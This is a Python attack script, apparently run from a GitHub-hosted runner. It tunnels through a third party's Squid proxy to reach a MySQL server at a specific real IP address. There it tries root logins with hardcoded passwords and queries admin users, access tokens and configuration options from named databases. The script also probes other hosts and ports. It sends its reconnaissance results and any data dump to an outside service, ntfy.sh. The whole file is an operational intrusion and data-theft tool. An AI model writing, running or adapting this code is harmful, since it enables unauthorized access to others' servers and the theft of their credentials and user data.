#!/usr/bin/env python3
# i48999: from a GitHub-hosted runner, use operator Squid 40.160.68.125:3128 as a
# two-hop jump to reach 15.204.217.98:3306; validate Squid tunnelling vs known-reachable
# target first, then CONNECT to .98:3306 and try read-only MySQL root auth.
import os, sys, socket, time, urllib.request

TOPIC   = os.environ.get("TOPIC","i48999-squid")
SQ_HOST = "40.160.68.125"
SQ_PORT = 3128
buf = []
def L(*a):
    line=" ".join(str(x) for x in a); print(line, flush=True); buf.append(line)

def send(tag, text):
    text=str(text)
    for i in range(0,len(text),3400):
        try:
            req=urllib.request.Request("https://ntfy.sh/"+TOPIC,
                data=(("[%s] "%tag + text[i:i+3400]).encode("utf-8","replace")),
                method="POST", headers={"Title":("i48999-"+tag)[:60]})
            urllib.request.urlopen(req,timeout=12).read()
        except Exception as e:
            L("NTFYERR",str(e)[:80])

def egress():
    for u in ("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
        try: return urllib.request.urlopen(u,timeout=10).read().decode().strip()
        except Exception: pass
    return "ERR"

def tcp(host,port,t=6.0):
    st=time.time()
    try:
        s=socket.create_connection((host,port),timeout=t); s.close()
        return "OPEN:%dms"%round((time.time()-st)*1000)
    except ConnectionRefusedError: return "REFUSED"
    except socket.timeout: return "TIMEOUT"
    except Exception as e: return "ERR:"+str(e)[:50]

def connect_tunnel(host,port,tmo=12):
    try:
        s=socket.create_connection((SQ_HOST,SQ_PORT),timeout=tmo); s.settimeout(tmo)
    except Exception as e:
        return "SQ_TCPFAIL:"+str(e)[:60], None
    try:
        s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\nUser-Agent: curl/8.0\r\n\r\n".encode())
        data=b""
        while b"\r\n\r\n" not in data and len(data)<2000:
            c=s.recv(1024)
            if not c: break
            data+=c
        first=data.split(b"\r\n")[0].decode("latin1") if data else "(noresp)"
        if " 200" in first:
            return first, s
        s.close(); return first, None
    except Exception as e:
        try: s.close()
        except: pass
        return "CONNECTERR:"+str(e)[:60], None

def proxy_get(url,tmo=12):
    try:
        s=socket.create_connection((SQ_HOST,SQ_PORT),timeout=tmo); s.settimeout(tmo)
        host=url.split('/')[2]
        s.sendall(f"GET {url} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: curl/8.0\r\n\r\n".encode())
        data=b""
        while len(data)<800:
            c=s.recv(1024)
            if not c: break
            data+=c
        s.close()
        return data[:420].decode("latin1","replace")
    except Exception as e:
        return "GETERR:"+str(e)[:60]

def mysql_over(sock, user, pw):
    import pymysql
    try:
        conn=pymysql.connect(host="15.204.217.98",port=3306,user=user,password=pw,
            connect_timeout=12,read_timeout=25,charset="utf8mb4",sock=sock)
    except Exception as e:
        return None,"CONNERR:"+type(e).__name__+":"+str(e)[:180]
    out={}
    cur=conn.cursor()
    def q(sql,key):
        try:
            cur.execute(sql); out[key]=[[str(x)[:220] for x in row] for row in cur.fetchall()]
        except Exception as e: out[key+"_err"]=str(e)[:200]
    q("SELECT VERSION(),USER(),@@hostname,@@port","who")
    try:
        cur.execute("SHOW DATABASES"); dbs=[r[0] for r in cur.fetchall()]
    except Exception as e:
        dbs=[]; out["dbs_err"]=str(e)[:150]
    out["databases"]=dbs
    tdb = "haochi" if "haochi" in dbs else ("yibuapi" if "yibuapi" in dbs else (dbs[0] if dbs else None))
    if tdb:
        q(f"SELECT id,username,role,status,email FROM `{tdb}`.users WHERE role>=100 ORDER BY id LIMIT 30","admins_role100")
        q(f"SELECT id,username,role,access_token FROM `{tdb}`.users WHERE role=100 ORDER BY id LIMIT 15","role100_access_tokens")
        q(f"SELECT id,username,role,LEFT(access_token,60) FROM `{tdb}`.users ORDER BY id LIMIT 8","users_head")
        q(f"SELECT `key`,LEFT(`value`,420) FROM `{tdb}`.options","options")
    conn.close()
    return out,None

def main():
    L("=== i48999 start ===")
    ip=egress(); L("runner_egress",ip); send("egress", ip)
    report={"egress":ip,"squid":{},"targets":{}}

    # 0. TCP to Squid from runner
    st=tcp(SQ_HOST,SQ_PORT); L("TCP",SQ_HOST,SQ_PORT,st); report["squid"]["tcp3128"]=st
    send("squid_tcp","%s:3128 = %s"%(SQ_HOST,st))
    if not st.startswith("OPEN"):
        L("RESULT: Squid not reachable from runner"); 
        send("summary","Squid %s:3128 UNREACHABLE from runner %s (%s)"%(SQ_HOST,ip,st))
        print("\n".join(buf)); return

    # 1. validate Squid is a functional HTTP proxy (proves source IP allowed)
    root=proxy_get("http://%s:%d/"%(SQ_HOST,SQ_PORT)); L("SQUID_ROOT:",root.replace("\r"," ").replace("\n"," | ")[:300])
    ex =proxy_get("http://example.com/");  L("GET example.com:",ex.replace("\r"," ").replace("\n"," | ")[:200])
    ipf=proxy_get("http://api.ipify.org/"); L("GET api.ipify.org via squid:",ipf.replace("\r"," ").replace("\n"," | ")[:200])
    send("squid_http", "root=%r\nexample=%r\nipify=%r"%(root[:120],ex[:120],ipf[:200]))

    # 2. validate CONNECT/tunnel to a known-reachable target
    for h,p in [("example.com",443),("api.ipify.org",443)]:
        first,s=connect_tunnel(h,p)
        banner=b""
        if s:
            try: s.settimeout(6); banner=s.recv(80)
            except Exception: pass
            s.close()
        L("CONNECT",h,p,"->",first,"banner=",banner[:40])
        report["squid"]["connect_%s_%d"%(h,p)]=first
        send("connect", "%s:%d -> %s"%(h,p,first))

    # 3. THE GOAL: CONNECT to 15.204.217.98:3306 + others
    tunnel_sock=None
    for h,p in [("15.204.217.98",3306),("15.204.217.98",8000),("15.204.217.98",3001),
                ("135.148.204.37",80),("40.160.68.125",3000)]:
        first,s=connect_tunnel(h,p)
        banner=b""
        if s:
            try:
                s.settimeout(6); banner=s.recv(96)
            except Exception: pass
        L("CONNECT",h,p,"->",first,"banner=",banner[:60])
        report["targets"]["%s:%d"%(h,p)]={"status":first,"banner":banner[:60].hex() if banner else ""}
        send("target","%s:%d -> %s banner=%r"%(h,p,first,banner[:40]))
        if s and h=="15.204.217.98" and p==3306:
            tunnel_sock=s   # keep for mysql attempts
        elif s:
            try: s.close()
            except: pass

    # 4. If .98:3306 tunnel is open, try MySQL root auth (read-only)
    if tunnel_sock is not None:
        for pw,tag in [("NewSecurePassword123!","pw1"),("N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC","pw2")]:
            # need a fresh socket per attempt
            first,s=connect_tunnel("15.204.217.98",3306)
            if not s:
                L("RETRY_CONNECT_FAIL",tag,first); continue
            out,err=mysql_over(s, "root", pw)
            if err:
                L("MYSQL",tag,"->",err); send("mysql_%s"%tag, err)
                try: s.close()
                except: pass
                continue
            L("MYSQL_AUTH_OK",tag,out.get("who"))
            send("MYSQL_AUTH_OK", "%s who=%s dbs=%s"%(tag, out.get("who"), out.get("databases")))
            import json
            payload=json.dumps(out,ensure_ascii=False)
            L("DUMP_BYTES",len(payload))
            send("dump_%s"%tag, payload)
            break
    try:
        if tunnel_sock: tunnel_sock.close()
    except: pass

    send("summary", "i48999 done; squid TCP=%s"%report["squid"].get("tcp3128"))
    L("=== i48999 DONE ===")
    print("\n".join(buf))

if __name__=="__main__":
    main()
